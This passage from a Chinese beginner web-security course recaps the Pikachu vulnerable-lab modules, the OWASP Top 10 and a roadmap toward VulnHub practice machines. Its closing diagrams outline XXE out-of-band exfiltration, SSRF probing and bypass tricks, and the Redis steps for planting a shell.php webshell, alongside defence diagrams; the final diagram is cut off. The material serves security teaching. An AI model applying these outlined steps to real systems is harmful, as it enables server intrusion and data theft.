Pikachu里的越权模块我们就不细演示了，大家知道有这么个东西就行。反正就是权限没控制好，导致能访问不该访问的东西。

好了，这些小模块我们都快速过了一遍。是不是觉得大开眼界？原来Web漏洞有这么多种类！😲

---

## Pikachu靶场通关总结 🏆

好了，Pikachu靶场我们从头到尾算是过了一遍了。来，我们一起回顾一下，我们都学了哪些漏洞？

让我们来盘点一下：

### 我们学过的漏洞清单 📋

| 漏洞类型 | 危险程度 | 难度 | 我们学过没？ |
|---------|---------|------|------------|
| 🔴 **XSS（跨站脚本）** | 高 | ⭐⭐ | ✅ DVWA + Pikachu |
| 🔵 **SQL注入** | 极高 | ⭐⭐⭐ | ✅ DVWA + SQLi-Labs + Pikachu |
| 🟢 **CSRF（跨站请求伪造）** | 中 | ⭐⭐ | ✅ DVWA + Pikachu |
| 🟡 **文件上传** | 极高 | ⭐⭐⭐ | ✅ DVWA + Upload-Labs + Pikachu |
| 🟣 **文件包含** | 高 | ⭐⭐⭐ | ✅ DVWA + Pikachu |
| 🟠 **命令执行** | 极高 | ⭐⭐⭐ | ✅ DVWA + Pikachu |
| 🔴 **代码执行** | 极高 | ⭐⭐⭐ | ✅ Pikachu |
| 🟤 **XXE（XML外部实体注入）** | 高 | ⭐⭐⭐⭐ | ✅ Pikachu（了解 |
| ⚫ **SSRF（服务端请求伪造）** | 高 | ⭐⭐⭐⭐ | ✅ Pikachu（了解 |
| 🟪 **PHP反序列化** | 极高 | ⭐⭐⭐⭐⭐ | ✅ Pikachu（了解） |
| 🟩 **越权访问** | 高 | ⭐⭐⭐ | ✅ Pikachu（了解） |
| ⬜ **目录遍历** | 中 | ⭐⭐ | ✅ Pikachu（了解） |
| ⬛ **未授权访问** | 高 | ⭐ | ✅ 了解概念 |

哇塞！是不是一算吓一跳！我们居然已经学了这么多漏洞了！🎊🎉

是不是很有成就感？想当初我们刚入门的时候，连XSS是什么都不知道，现在居然能说出这么多漏洞名字了，而且每个还能知道大概是干啥的。进步很大嘛~ 给自己鼓个掌！👏👏👏

### Pikachu的意义 🎯

Pikachu靶场对我们来说，意义是什么呢？

我觉得主要有这几点：

#### 1. 综合复习 📚

很多漏洞我们之前都学过了，Pikachu相当于一次"期中考试"，把我们学过的东西都复习了一遍。

就像你学完了一本书，最后来个总复习，查漏补缺。

#### 2. 开阔眼界 👀

Pikachu里还有很多我们之前没学过的漏洞，比如XXE、SSRF、反序列化、越权等等。

这些漏洞让我们知道：哦！原来Web安全还有这么多东西呢！原来不只是XSS和SQL注入啊！

就像你刚出了村子，才发现原来世界这么大！🌍

#### 3. 建立知识体系 🗺️

打完Pikachu，我们脑子里应该对Web安全有了一个整体的认识。知道Web安全大概有哪些方面，每个方面大概是干啥的。

就像你拿到了一张地图，知道哪里有山，哪里有水，哪里有路。以后再往里填东西就行~

> **小感悟** 💡
> 
> 学习Web安全，就像学武功。
> 一开始你只会几招基础招式（XSS、SQL注入这些），觉得自己很厉害。
> 后来发现，哦，原来还有这么多招式啊！
> 再后来，你把所有招式都学会了，融会贯通，那就真的厉害了！
> 
> 我们现在还在"见山是山的阶段，继续加油！💪

---

## Web漏洞全景图：Web安全世界地图 🗺️

好了，Pikachu我们打完了。接下来，我给大家梳理一下，常见的Web漏洞都有哪些？我们现在学到什么程度了？

给大家画一张"Web安全世界地图"，让大家心里有个数。🗺️

### OWASP Top 10是什么？

首先给大家介绍一个东西——**OWASP Top 10**。

OWASP是什么？OWASP是一个国际上很有名的安全组织，叫"开放式Web应用程序安全项目"（Open Web Application Security Project）。

他们每隔几年会出一个榜单，叫"OWASP Top 10"，列出了Web应用程序最危险的10个漏洞。

这个榜单就像Web安全界的"福布斯排行榜"，最危险的10个漏洞就在上面。

2021年的OWASP Top 10是这样的（最新版）：

| 排名 | 漏洞名称 | 说明 |
|------|---------|------|
| 1 | 访问控制失效 | Broken Access Control | 权限没做好，比如越权、未授权访问 |
| 2 | 加密机制失效 | Cryptographic Failures | 敏感数据没加密，明文传输之类的 |
| 3 | 注入 | Injection | SQL注入、命令注入、代码注入等等 |
| 4 | 不安全设计 | Insecure Design | 设计层面就有问题 |
| 5 | 安全配置错误 | Security Misconfiguration | 配置不对，比如默认密码、不必要的功能开着 |
| 6 | 易受攻击和过时的组件 | Vulnerable and Outdated Components | 用的第三方组件有漏洞 |
| 7 | 认证和授权失效 | Identification and Authentication Failures | 身份验证没做好，比如弱密码、暴力破解 |
| 8 | 软件和数据完整性失效 | Software and Data Integrity Failures | 软件更新、数据传输没验证完整性 |
| 9 | 安全日志和监控失效 | Security Logging and Monitoring Failures | 没日志、没监控，被攻击了不知道 |
| 10 | 服务端请求伪造 | Server-Side Request Forgery | SSRF |

（注：这是2021年的版本，每隔几年会更新一次）

看到没？我们学过的SQL注入、XSS、CSRF、文件上传、命令执行、SSRF这些，全都是榜上有名的！都是最危险的那些漏洞！😱

所以说，我们学的都是最核心、最实用的东西。不是那些花拳绣腿，都是真功夫！💪

### 我们现在学到什么程度了？ 📊

那我们现在学到什么程度了呢？我给大家打个分：

- **Web漏洞入门：✅ 完成了
- **常见漏洞了解：✅ 大部分都知道了
- **漏洞原理理解：✅ 基本都懂了
- **简单漏洞利用：✅ 简单的能利用了
- **高级漏洞防御：⬜ 还需要加强
- **代码审计：⬜ 还没开始学
- **综合渗透测试：⬜ 还没开始练

大概就是这么个水平。我们现在相当于"小学毕业"了，接下来该上"初中"了！🎓

> **小比喻** 🎯
> 
> 学Web安全就像上学：
> - 小学：学各种漏洞基础，知道每个漏洞是什么，怎么简单利用
> - 初中：学综合渗透测试，打完整靶机，练完整流程
> - 高中：学代码审计，挖0day，研究高级技术
> - 大学：研究安全研究，自己挖掘新漏洞，做安全研究
> 
> 我们现在小学毕业了！恭喜大家！🎊🎉

是不是很有成就感？想当初我们连环境都不会搭，现在都小学毕业了！进步真的很大！👏

---

## 接下来学什么？未来路线图 🛣️

好了，Pikachu我们打完了，Web漏洞基础我们也学完了。那接下来学什么呢？🤔

很多小伙伴可能会问："学完这些，我接下来该往哪走啊？有点迷茫..."

别慌！我给大家指条明路！💡

### 路线图 🗺️

我们的学习路线大概是这样的：

```
Web漏洞基础 → 综合渗透测试 → 代码审计 → 高级技术
    ↓              ↓              ↓
  DVWA          VulnHub      PHP代码审计
SQLi-Labs      各种靶机     Java代码审计
Upload-Labs     ...          ...
Pikachu         ...          ...
   ...           ...          ...
```

我们现在处于第一个阶段快结束了，接下来进入第二个阶段——**综合渗透测试**！

### 什么是综合渗透测试？

之前我们学的都是单个的漏洞，这个页面有XSS，那个页面有SQL注入。都是孤立的、一个一个的。

但是！真实的网站不是这样的啊！真实的网站是一个完整的系统，有很多页面，很多功能。你得你得想办法进去，拿到权限，一步步深入，最后拿到服务器权限。

这就是**综合渗透测试**！

> **生活小例子** 🎯
> 
> 以前我们学的是：
> - 练拳击，学怎么出拳（XSS怎么用
> - 学踢腿（SQL注入怎么用
> - 学擒拿（文件上传怎么用）
> - 都是单个招式
> 
> 接下来我们要学的是：
> - 真正的打架！
> - 对方出拳我怎么应对，对方踢腿我怎么躲
> - 怎么组合招式，怎么一步步把对方打倒
> - 完整的一套组合拳！🥊

简单说，就是从"学招式"变成"真打架"！

### VulnHub是什么？

那综合渗透测试怎么练？练什么靶机啊！

接下来我们要介绍一个神器——**VulnHub**！

VulnHub是什么？VulnHub是一个网站，上面有很多很多的虚拟机靶机。这些靶机都是完整的操作系统，里面有各种漏洞，你可以下载下来，用VMware或者VirtualBox打开，然后就像攻击真实的服务器一样去攻击它。

就像一个"军事演习"，对面是一个完整的"敌军阵地，你要想办法攻进去，拿到旗帜（flag）。🚩

VulnHub上的靶机有难有易，新手可以从简单的开始，一步步往难了打。

> **生活小例子** 🎯
> 
> 以前的靶场（DVWA、Pikachu这些）就像：
> - 打靶练习，靶子放在那不动，你练枪法
> 
> VulnHub的靶机就像：
> - 真人CS，对面是一个完整的敌人，你得想办法干掉他
> 
> 哪个更刺激？当然是真人CS更刺激！🎮

是不是听着就很刺激是不是？😎

### 从Jangow开始！🚀

VulnHub上的靶机那么多，我们从哪个开始呢？

别担心，我给大家推荐一个新手友好的靶机——**Jangow**！

Jangow这个靶机，难度不高，很适合新手入门。它就像你的第一个"新手村"的第一个BOSS，难度适中，刚好适合练手。

打Jangow这个靶机，我们会学到：
- 信息收集（怎么扫端口、扫目录）
- 漏洞发现（怎么找漏洞）
- 漏洞利用（怎么利用漏洞拿shell）
- 提权（怎么从普通用户升到管理员）
- 完整的渗透测试流程

打完Jangow，你就对完整的渗透测试有概念了！

> **小预告** 🎯
> 
> 下一章，我们就来：
> 1. 介绍VulnHub是什么
> 2. 怎么下载靶机
> 3. 怎么搭建环境
> 4. 打第一个靶机Jangow
> 5. 完整的渗透测试流程
> 
> 是不是很期待？😆

---

## 本章总结 + 下章预告 📝

好了，这一章我们就讲到这里了。内容不少，我们来总结一下。

### 本章总结 📋

这一章我们主要讲了什么呢？

1. **CSRF模块**：复习了一下CSRF，GET型、POST型、Token验证，都是老朋友了。
2. **命令执行/代码执行**：两个高危漏洞，命令执行执行系统命令，代码执行执行PHP代码，都很危险。
3. **XXE漏洞**：XML外部实体注入，能读文件、能SSRF，了解概念就行。
4. **SSRF漏洞**：服务端请求伪造，让服务器帮你发请求，能扫内网、能读文件，了解概念就行。
5. **PHP反序列化**：把字符串变回对象，配合魔法方法能执行代码，比较难，了解概念就行。
6. **目录遍历**：用../../访问web目录外的文件，比较简单。
7. **未授权访问/越权**：权限没做好，不用登录就能进，或者能访问别人的东西。
8. **Pikachu总结**：我们学了好多漏洞啊！XSS、SQL注入、文件上传、文件包含、CSRF、命令执行、代码执行、XXE、SSRF、反序列化、越权、目录遍历...
9. **Web漏洞全景图**：介绍了OWASP Top 10，我们学的都是最核心的漏洞。
10. **接下来学什么**：接下来学综合渗透测试，打VulnHub上的靶机，从Jangow开始。

是不是收获满满？这一章我们不仅学了好多新知识，还对整个Web安全有了一个整体的认识。🗺️

### 给新手的话 💬

最后，我想跟大家说几句心里话。

学到这里，Web安全的基础我们算是入门了。从最开始连环境都不会搭，到现在能说出十几种漏洞，每个都能说上个一二三。进步真的很大！

但是！这只是开始而已。Web安全的世界很大，还有很多很多东西等着我们去探索。

不要觉得"我学完了，我厉害了"。永远保持一颗学习。

学安全，就是这样，永远有学不完的东西。今天出个新漏洞，你就得学。技术在更新，漏洞也在更新。活到老，学到老。📚

但是也别害怕，别焦虑。一步一个脚印，慢慢来。每天进步一点点，时间长了你就发现自己已经走了很远了。🚶

> **一句话与大家共勉：
> **路虽远，行则将至；事虽难，做则必成！💪

### 下章预告 📢

下一章，我们将进入一个全新的阶段——综合渗透测试！

我们会：
- 介绍VulnHub是什么
- 教大家怎么下载和安装虚拟机靶机
- 打我们的第一个完整靶机——Jangow
- 体验完整的渗透测试流程

是不是很期待？那就让我们下一章再见！👋

加油，各位未来的白帽子们！我们下章见！🚀

---

**本章完** ✅

---

# 🖼️ 本章拓展图解汇总（day-31 · 共20张SVG架构图）


<svg width="800" height="236" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 236">
  <defs><linearGradient id="gc9ynhcyp" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#eff6ff"/><stop offset="100%" stop-color="#dbeafe"/></linearGradient></defs>
  <rect x="0" y="0" width="800" height="236" rx="12" fill="url(#gc9ynhcyp)"/>
  <rect x="12" y="12" width="776" height="44" rx="8" fill="#0e7490" opacity="0.88"/>
  <text x="400" y="40" text-anchor="middle" fill="#ffffff" font-weight="bold" font-size="18">🎯 XXE/SSRF/PHP反序列化 三大模块全景</text>
  <rect x="60" y="90" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">XXE XML外部实体注入</text>
  <rect x="300" y="90" width="220" height="55" rx="10" fill="#f0fdf4" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">SSRF 服务端请求伪造</text>
  <rect x="540" y="90" width="220" height="55" rx="10" fill="#fef3c7" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">PHP反序列化 POP链</text>
  <rect x="60" y="163" width="220" height="55" rx="10" fill="#fce7f3" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">共同: 不信任输入 → RCE</text>
</svg>

<svg width="800" height="236" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 236">
  <defs><linearGradient id="gmtv283yk" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#eff6ff"/><stop offset="100%" stop-color="#dbeafe"/></linearGradient></defs>
  <rect x="0" y="0" width="800" height="236" rx="12" fill="url(#gmtv283yk)"/>
  <rect x="12" y="12" width="776" height="44" rx="8" fill="#0e7490" opacity="0.88"/>
  <text x="400" y="40" text-anchor="middle" fill="#ffffff" font-weight="bold" font-size="18">📚 XXE 三大文件读取姿势</text>
  <rect x="60" y="90" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">① 有回显 直接ENTITY</text>
  <rect x="300" y="90" width="220" height="55" rx="10" fill="#f0fdf4" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">② php://filter Base64读源码</text>
  <rect x="540" y="90" width="220" height="55" rx="10" fill="#fef3c7" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">③ CDATA包装 读特殊字符</text>
  <rect x="60" y="163" width="220" height="55" rx="10" fill="#fce7f3" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">④ Blind/OOB 不出网带外</text>
</svg>

<svg width="800" height="236" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 236">
  <defs><linearGradient id="gp1zhihux" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#eff6ff"/><stop offset="100%" stop-color="#dbeafe"/></linearGradient></defs>
  <rect x="0" y="0" width="800" height="236" rx="12" fill="url(#gp1zhihux)"/>
  <rect x="12" y="12" width="776" height="44" rx="8" fill="#0e7490" opacity="0.88"/>
  <text x="400" y="40" text-anchor="middle" fill="#ffffff" font-weight="bold" font-size="18">🗺️ XXE OOB 带外攻击流程</text>
  <rect x="60" y="90" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">受害者XML解析</text>
  <rect x="300" y="90" width="220" height="55" rx="10" fill="#f0fdf4" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">LDAP/DNS HTTP请求</text>
  <rect x="540" y="90" width="220" height="55" rx="10" fill="#fef3c7" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">攻击者VPS</text>
  <rect x="60" y="163" width="220" height="55" rx="10" fill="#fce7f3" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">接收file内容</text>
  <rect x="300" y="163" width="220" height="55" rx="10" fill="#f5f3ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">带外成功</text>
</svg>

<svg width="800" height="236" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 236">
  <defs><linearGradient id="g6x1onxlf" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#eff6ff"/><stop offset="100%" stop-color="#dbeafe"/></linearGradient></defs>
  <rect x="0" y="0" width="800" height="236" rx="12" fill="url(#g6x1onxlf)"/>
  <rect x="12" y="12" width="776" height="44" rx="8" fill="#166534" opacity="0.88"/>
  <text x="400" y="40" text-anchor="middle" fill="#ffffff" font-weight="bold" font-size="18">🛡️ XXE 防护五大最佳实践</text>
  <rect x="60" y="90" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">禁用外部实体</text>
  <rect x="300" y="90" width="220" height="55" rx="10" fill="#f0fdf4" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">禁用DTD</text>
  <rect x="540" y="90" width="220" height="55" rx="10" fill="#fef3c7" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">禁用内联DTD</text>
  <rect x="60" y="163" width="220" height="55" rx="10" fill="#fce7f3" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">用户输入白名单</text>
  <rect x="300" y="163" width="220" height="55" rx="10" fill="#f5f3ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">禁用net扩展</text>
</svg>

<svg width="800" height="236" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 236">
  <defs><linearGradient id="gt18kpqga" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#eff6ff"/><stop offset="100%" stop-color="#dbeafe"/></linearGradient></defs>
  <rect x="0" y="0" width="800" height="236" rx="12" fill="url(#gt18kpqga)"/>
  <rect x="12" y="12" width="776" height="44" rx="8" fill="#0d9488" opacity="0.88"/>
  <text x="400" y="40" text-anchor="middle" fill="#ffffff" font-weight="bold" font-size="18">🔎 SSRF 六大攻击面</text>
  <rect x="60" y="90" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">URL分享</text>
  <rect x="300" y="90" width="220" height="55" rx="10" fill="#f0fdf4" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">图片加载</text>
  <rect x="540" y="90" width="220" height="55" rx="10" fill="#fef3c7" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">RSS订阅</text>
  <rect x="60" y="163" width="220" height="55" rx="10" fill="#fce7f3" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">WebHook</text>
  <rect x="300" y="163" width="220" height="55" rx="10" fill="#f5f3ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">邮件抓图</text>
  <rect x="540" y="163" width="220" height="55" rx="10" fill="#ecfeff" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">远程资源</text>
</svg>

<svg width="800" height="236" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 236">
  <defs><linearGradient id="gmwp9rhfe" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#eff6ff"/><stop offset="100%" stop-color="#dbeafe"/></linearGradient></defs>
  <rect x="0" y="0" width="800" height="236" rx="12" fill="url(#gmwp9rhfe)"/>
  <rect x="12" y="12" width="776" height="44" rx="8" fill="#155e75" opacity="0.88"/>
  <text x="400" y="40" text-anchor="middle" fill="#ffffff" font-weight="bold" font-size="18">🛰️ SSRF 六大协议利用矩阵</text>
  <rect x="60" y="90" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">http(s) 网页</text>
  <rect x="300" y="90" width="220" height="55" rx="10" fill="#f0fdf4" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">file 本地</text>
  <rect x="540" y="90" width="220" height="55" rx="10" fill="#fef3c7" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">dict 字典/Redis</text>
  <rect x="60" y="163" width="220" height="55" rx="10" fill="#fce7f3" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">gopher Redis/MySQL</text>
  <rect x="300" y="163" width="220" height="55" rx="10" fill="#f5f3ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">ftp 穿越</text>
  <rect x="540" y="163" width="220" height="55" rx="10" fill="#ecfeff" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">ldap JNDI</text>
</svg>

<svg width="800" height="236" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 236">
  <defs><linearGradient id="gd6ktqrbg" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#eff6ff"/><stop offset="100%" stop-color="#dbeafe"/></linearGradient></defs>
  <rect x="0" y="0" width="800" height="236" rx="12" fill="url(#gd6ktqrbg)"/>
  <rect x="12" y="12" width="776" height="44" rx="8" fill="#16a34a" opacity="0.88"/>
  <text x="400" y="40" text-anchor="middle" fill="#ffffff" font-weight="bold" font-size="18">📡 SSRF 内网探测思路</text>
  <rect x="60" y="90" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">127.0.0.1 本地</text>
  <rect x="300" y="90" width="220" height="55" rx="10" fill="#f0fdf4" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">10网段扫描</text>
  <rect x="540" y="90" width="220" height="55" rx="10" fill="#fef3c7" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">172.16网段</text>
  <rect x="60" y="163" width="220" height="55" rx="10" fill="#fce7f3" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">192.168 C段</text>
  <rect x="300" y="163" width="220" height="55" rx="10" fill="#f5f3ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">端口指纹</text>
  <rect x="540" y="163" width="220" height="55" rx="10" fill="#ecfeff" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">Redis/ES/Mongo</text>
</svg>

<svg width="800" height="236" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 236">
  <defs><linearGradient id="gz3en5v3c" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#eff6ff"/><stop offset="100%" stop-color="#dbeafe"/></linearGradient></defs>
  <rect x="0" y="0" width="800" height="236" rx="12" fill="url(#gz3en5v3c)"/>
  <rect x="12" y="12" width="776" height="44" rx="8" fill="#7c3aed" opacity="0.88"/>
  <text x="400" y="40" text-anchor="middle" fill="#ffffff" font-weight="bold" font-size="18">🧱 SSRF 绕过姿势清单</text>
  <rect x="60" y="90" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">localhost别名</text>
  <rect x="300" y="90" width="220" height="55" rx="10" fill="#f0fdf4" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">[::] IPv6</text>
  <rect x="540" y="90" width="220" height="55" rx="10" fill="#fef3c7" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">30x跳转</text>
  <rect x="60" y="163" width="220" height="55" rx="10" fill="#fce7f3" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">短链接</text>
  <rect x="300" y="163" width="220" height="55" rx="10" fill="#f5f3ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">DNS重绑定</text>
  <rect x="540" y="163" width="220" height="55" rx="10" fill="#ecfeff" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">@封闭字符</text>
</svg>

<svg width="800" height="236" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 236">
  <defs><linearGradient id="gam57s1kr" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#eff6ff"/><stop offset="100%" stop-color="#dbeafe"/></linearGradient></defs>
  <rect x="0" y="0" width="800" height="236" rx="12" fill="url(#gam57s1kr)"/>
  <rect x="12" y="12" width="776" height="44" rx="8" fill="#0369a1" opacity="0.88"/>
  <text x="400" y="40" text-anchor="middle" fill="#ffffff" font-weight="bold" font-size="18">📦 SSRF+Redis 写WebShell</text>
  <rect x="60" y="90" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">dict CONFIG SET dir</text>
  <rect x="300" y="90" width="220" height="55" rx="10" fill="#f0fdf4" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">dbfilename shell.php</text>
  <rect x="540" y="90" width="220" height="55" rx="10" fill="#fef3c7" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">SET 小马内容</text>
  <rect x="60" y="163" width="220" height="55" rx="10" fill="#fce7f3" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">SAVE 持久化</text>
  <rect x="300" y="163" width="220" height="55" rx="10" fill="#f5f3ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">访问shell.php</text>
</svg>

<svg width="800" height="236" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 236">
  <defs><linearGradient id="gojyixhl6" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#eff6ff"/><stop offset="100%" stop-color="#dbeafe"/></linearGradient></defs>
  <rect x="0" y="0" width="800" height="236" rx="12" fill="url(#gojyixhl6)"/>
  <rect x="12" y="12" width="776" height="44" rx="8" fill="#1e3a8a" opacity="0.88"/>
  <text x="400" y="40" text-anchor="middle" fill="#ffffff" font-weight="bold" font-size="18">🧷 Gopher 协议Redis攻击序列</text>
  <rect x="60" y="90" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">AUTH可选</text>
  <rect x="300" y="90" width="220" height="55" rx="10" fill="#f0fdf4" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">CONFIG SET dir</text>
  <rect x="540" y="90" width="220" height="55" rx="10" fill="#fef3c7" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">CONFIG SET dbfilename</text>
  <rect x="60" y="163" width="220" height="55" rx="10" fill="#fce7f3" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">SET mykey 马内容</text>
  <rect x="300" y="163" width="220" height="55" rx="10" fill="#f5f3ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">SAVE → RCE</text>
</svg>

<svg width="800" height="236" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 236">
  <defs><linearGradient id="gg6l5i3jt" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#eff6ff"/><stop offset="100%" stop-color="#dbeafe"/></linearGradient></defs>
  <rect x="0" y="0" width="800" height="236" rx="12" fill="url(#gg6l5i3jt)"/>
  <rect x="12" y="12" width="776" height="44" rx="8" fill="#166534" opacity="0.88"/>
  <text x="400" y="40" text-anchor="middle" fill="#ffffff" font-weight="bold" font-size="18">🛡️ SSRF 多层防御架构</text>
  <rect x="60" y="90" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">URL白名单</text>
  <rect x="300" y="90" width="220" height="55" rx="10" fill="#f0fdf4" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">协议限制</text>
  <rect x="540" y="90" width="220" height="55" rx="10" fill="#fef3c7" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">禁用跳转</text>
  <rect x="60" y="163" width="220" height="55" rx="10" fill="#fce7f3" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">内网禁止</text>
  <rect x="300" y="163" width="220" height="55" rx="10" fill="#f5f3ff" stroke="#64748b" stroke-width="2"/>
